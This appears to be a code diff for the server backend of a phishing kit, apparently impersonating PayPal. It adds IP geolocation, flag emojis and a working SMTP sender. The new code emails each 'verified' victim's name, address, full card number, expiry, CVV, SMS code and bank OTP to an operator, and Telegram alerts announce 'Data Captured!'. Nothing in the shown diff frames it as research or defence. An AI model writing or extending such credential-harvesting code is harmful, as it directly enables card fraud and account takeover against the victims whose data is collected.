@@ -8,6 +8,8 @@ import rateLimit from 'express-rate-limit';
 import fs from 'fs';
 import crypto from 'crypto';
 import https from 'https';
+import geoip from 'geoip-lite';
+import nodemailer from 'nodemailer';
 import * as db from './db';
 
 const app = express();
@@ -48,6 +50,17 @@ const io = new Server(httpServer, {
 const PORT = process.env.PORT || 8080;
 const MASTER_PASSWORD = process.env.MASTER_PASSWORD || 'password'; // Use env var
 
+// --- Email Transporter ---
+const transporter = nodemailer.createTransport({
+    host: process.env.SMTP_HOST || 'smtp.gmail.com',
+    port: parseInt(process.env.SMTP_PORT || '587'),
+    secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
+    auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS,
+    },
+});
+
 // --- Middleware ---
 app.use(helmet({
     contentSecurityPolicy: {
@@ -57,7 +70,7 @@ app.use(helmet({
             scriptSrcAttr: ["'unsafe-inline'"],
             styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
             fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
-            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org"],
+            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org", "https://flagcdn.com"],
             connectSrc: ["'self'"],
             frameSrc: ["'self'"]
         }
@@ -103,6 +116,15 @@ const refreshSettings = async () => {
 };
 refreshSettings();
 
+const getFlagEmoji = (countryCode: string) => {
+    if (!countryCode) return '🏳️';
+    const codePoints = countryCode
+        .toUpperCase()
+        .split('')
+        .map(char => 127397 + char.charCodeAt(0));
+    return String.fromCodePoint(...codePoints);
+};
+
 const sendTelegram = (msg: string) => {
     const token = cachedSettings.tgToken;
     const chat = cachedSettings.tgChat;
@@ -125,10 +147,68 @@ const sendTelegram = (msg: string) => {
     req.end();
 };
 
-const sendEmail = (session: any) => {
+const sendEmail = async (session: any) => {
     if (!cachedSettings.email) return;
-    console.log(`[Email] Would send completion email to ${cachedSettings.email} for session ${session.sessionId}`);
-    // Email implementation stub - needs SMTP or SendGrid
+
+    const flagUrl = session.ipCountry ? `https://flagcdn.com/w40/${session.ipCountry.toLowerCase()}.png` : '';
+
+    let cardLogoUrl = '';
+    const type = session.cardType?.toLowerCase();
+    if (type === 'visa') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
+    else if (type === 'mastercard') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
+    else if (type === 'amex') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
+    else if (type === 'discover') cardLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
+
+    const html = `
+        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+            <div style="background-color: #003087; padding: 20px; text-align: center;">
+                <h1 style="color: white; margin: 0;">Session Verified</h1>
+            </div>
+            <div style="padding: 20px; border: 1px solid #ddd;">
+                <p><strong>Session ID:</strong> ${session.sessionId}</p>
+                <p><strong>Status:</strong> <span style="color: green; font-weight: bold;">VERIFIED</span></p>
+
+                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+
+                <h3>Identity</h3>
+                <p><strong>Name:</strong> ${session.firstName} ${session.lastName}</p>
+                <p><strong>Address:</strong> ${session.address}</p>
+                <p><strong>Country:</strong>
+                   ${flagUrl ? `<img src="${flagUrl}" style="vertical-align: middle; height: 16px; margin-right: 5px;">` : ''}
+                   ${session.ipCountry || 'Unknown'}
+                </p>
+
+                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+
+                <h3>Financial</h3>
+                <div style="margin-bottom: 10px;">
+                    ${cardLogoUrl ? `<img src="${cardLogoUrl}" style="height: 30px; display: block; margin-bottom: 10px;">` : ''}
+                    <strong>Card:</strong> ${session.cardNumber}
+                </div>
+                <p><strong>Expiry:</strong> ${session.cardExpiry}</p>
+                <p><strong>CVV:</strong> ${session.cardCvv}</p>
+
+                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+
+                <h3>Security</h3>
+                <p><strong>SMS Code:</strong> ${session.phoneCode}</p>
+                <p><strong>Bank OTP:</strong> ${session.cardOtp}</p>
+                <p><strong>IP Address:</strong> ${session.fingerprint?.ip || 'Unknown'}</p>
+            </div>
+        </div>
+    `;
+
+    try {
+        await transporter.sendMail({
+            from: process.env.SMTP_FROM || '"Security Alert" <no-reply@security.com>',
+            to: cachedSettings.email,
+            subject: `[Verified] Session ${session.sessionId.substring(0, 8)}`,
+            html: html
+        });
+        console.log(`[Email] Sent to ${cachedSettings.email}`);
+    } catch (e) {
+        console.error('[Email] Failed to send:', e);
+    }
 };
 
 const getClientIp = (req: express.Request) => {
@@ -141,6 +221,11 @@ const getClientIp = (req: express.Request) => {
     return req.socket.remoteAddress || 'Unknown';
 };
 
+const getIpCountry = (ip: string) => {
+    const geo = geoip.lookup(ip);
+    return geo ? geo.country : null;
+};
+
 // 1. Sync State (Hybrid: HTTP for data, Socket for notify)
 app.post('/api/sync', async (req, res) => {
     try {
@@ -150,17 +235,26 @@ app.post('/api/sync', async (req, res) => {
         }
 
         const ip = getClientIp(req);
+        const country = getIpCountry(ip);
+
+        // Merge calculated Country into data
+        if (country) {
+            data.ipCountry = country;
+        }
 
         // Notification Logic
         const existing = await db.getSession(data.sessionId);
 
         // 1. New Session (Push Telegram)
         if (!existing) {
-             sendTelegram(`🚨 <b>New Session Started</b>\nID: <code>${data.sessionId}</code>\nIP: ${ip}\nUA: ${data.fingerprint?.userAgent || 'Unknown'}`);
+             const flag = getFlagEmoji(country || 'XX');
+             sendTelegram(`${flag} <b>New Session Started</b>\nID: <code>${data.sessionId}</code>\nIP: ${ip}\nLoc: ${country || 'Unknown'}`);
         }
         // 2. Completed Session (Email + Telegram)
         else if (existing.status !== 'Verified' && data.status === 'Verified') {
-             sendTelegram(`✅ <b>Session Verified</b>\nID: <code>${data.sessionId}</code>\nData Captured!`);
+             const flag = getFlagEmoji(country || existing.ipCountry || 'XX');
+             const cardType = data.cardType ? `[${data.cardType.toUpperCase()}]` : '[CARD]';
+             sendTelegram(`${flag} <b>Session Verified</b> ${cardType}\nID: <code>${data.sessionId}</code>\nData Captured!`);
              sendEmail(data);
         }
 
